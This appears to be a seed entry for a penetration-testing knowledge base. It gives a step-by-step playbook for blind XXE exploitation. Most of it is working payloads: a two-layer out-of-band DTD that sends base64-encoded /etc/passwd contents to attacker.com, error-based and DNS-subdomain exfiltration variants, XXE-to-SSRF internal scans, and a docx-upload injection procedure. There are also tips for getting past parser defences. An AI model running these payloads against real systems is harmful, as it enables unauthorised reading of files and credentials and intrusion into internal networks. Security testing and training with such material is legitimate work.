# [Seed] Blind XXE OOB -> Exfiltrating /etc/passwd and Probing the Internal Network

## Scenario Category
Penetration testing / Web exploitation

## Target Overview
A web endpoint accepts an XML request body (SOAP / docx upload parsing / a custom API) and does not echo the content back (that is, "blind XXE"). Use an external DTD plus parameter entity tricks to exfiltrate target files back to the attacker's server.

## Full Execution Chain

1. Probe points
   - Any Content-Type containing `xml` / `soap`, file uploads of docx/xlsx/pptx (which contain XML), or SVG
   - Inject a test payload and watch the response: errors / timing / OOB callbacks
2. First try simple XXE with output echoed back
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
   <r>&x;</r>
   ```
3. No echo but OOB works, so use an external DTD
   - Host evil.dtd on your own VPS
   - Get the server to load it and exfiltrate
4. OOB also blocked, so check whether error-based / blind boolean is viable
5. After getting /etc/passwd, expand the surface:
   - Internal port scanning (XXE -> SSRF)
   - Read application config files (database passwords / private keys)
   - Trigger SSRF against cloud metadata, see seed-006

## Pitfalls Encountered

| Problem | Cause | Solution | Time spent |
|------|------|---------|------|
| A plain SYSTEM "file://" throws an error | The parser has entity references disabled | Switch to nested parameter entities (%) | 30min |
| DTD parsing blows up when the file contains `<` `>` `&` | The XML spec forbids special characters inside parameter entities | Wrap the file in a base64 layer with `php://filter` | 40min |
| The OOB server got a callback on port 80 but the payload was not assembled correctly | Wrong number of DTD nesting levels | Follow the OOB template exactly (outer + inner) | 1h |
| The file was read but only came back partially | XML limits entity length (XML_MAX_TOKEN_BYTES) | Read in chunks with offsets | 1h |
| Internal SSRF returns connection refused everywhere | No internal services are listening on the application's subnet | Switch to localhost / 127.0.0.1 / internal service names (K8s) | 30min |
| The Java application will not budge | The default Java XML parser disables SYSTEM | Try the `jar:` protocol, or move to a SOAP endpoint which may use an older Apache Xerces | several hours |

## Toolchain Findings

- **XXEinjector** automates XXE exploitation (Ruby)
- **Burp Collaborator** / **interactsh** are essential for OOB
- **dnslog.cn / oast.online** are DNS-only OOB services, domestic and international respectively
- File upload scenarios: **a docx is just zip + xml**, so edit word/document.xml and zip it back up to inject
- The XXE chapter of **payloads-all-the-things** is the most complete cheatsheet

## Key Code/Commands

The standard two-layer OOB DTD (base64-encoded file exfiltration):

**evil.dtd (hosted on the attacker VPS)**:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8000/exfil?d=%file;'>">
%all;
```

**Request body sent to the target**:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://attacker.com:8000/evil.dtd">
  %remote;
  %send;
]>
<r>any</r>
```

**Attacker-side HTTP service to receive the data**:

```bash
python3 -m http.server 8000
# received GET /exfil?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=' | base64 -d
# -> root:x:0:0:root:/root:/bin/bash
```

XXE -> SSRF internal network scanning:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://172.16.0.10:8080/admin">]>
<r>&x;</r>
```

Error-based output, making the XML parser return the content inside an error message:

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<r>x</r>
```

**XXE via docx upload** (many document-processing applications are affected):

```bash
unzip target.docx -d unpacked/
# edit unpacked/word/document.xml and change the beginning to:
# <?xml version="1.0"?>
# <!DOCTYPE w:document [...XXE payload...]>
zip -r evil.docx unpacked/*
# upload evil.docx
```

## Suggested Improvements to This Package

- `pentest-tools/references/web-attack-cheatsheet.md` should have a complete XXE chapter (OOB / error / blind / docx upload / svg)
- Add interactsh-client to the bootstrap manifest (if not there already)
- Routing already covers XXE, but add an explicit "XXE OOB exfiltration" route

## Reusable Patterns/Script Snippets

**XXE type decision tree**:

```text
Output echoed        -> pull it straight out with SYSTEM "file://"
Errors are echoed    -> error-based payload (two levels of nesting + deliberately trigger a parse failure)
Nothing echoed       -> the standard two-layer OOB DTD (DNS / HTTP)
DNS works, HTTP does not -> DNS exfil (base32-encode the data into subdomains)
```

**XXE protocol list (test them against the parser)**:

```text
file://          -> read local files (most common)
http://, https:// -> SSRF
ftp://           -> also supported by older Java
gopher://        -> a tiny number of PHP parsers
expect://        -> command execution when PHP has the expect extension installed
jar://           -> Java extracts a file from a remote jar
netdoc://        -> older Java alternative to file://
```

**DNS exfil (the weakest channel)**:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; ext SYSTEM 'http://%file;.attacker.com/x'>">
%eval;
%ext;
<!-- the DNS log receives hostname.attacker.com -->
```

## Evolution Actions
- [ ] Add a complete XXE chapter to web-attack-cheatsheet.md
- [ ] Check interactsh-client in bootstrap-manifest
- [x] Routing already has an XXE entry point

## Environment Details
- Attacker VPS (public IP, ports 80/8000/53 open)
- Target: any web application that accepts XML input (PHP/Java/Python lxml/.NET are all affected)
- OOB: interactsh / dnslog.cn / self-hosted DNS

## Redaction Requirements
This entry is seed data written from publicly documented web exploitation patterns and does not involve any real production target. All domains/IPs are placeholders.
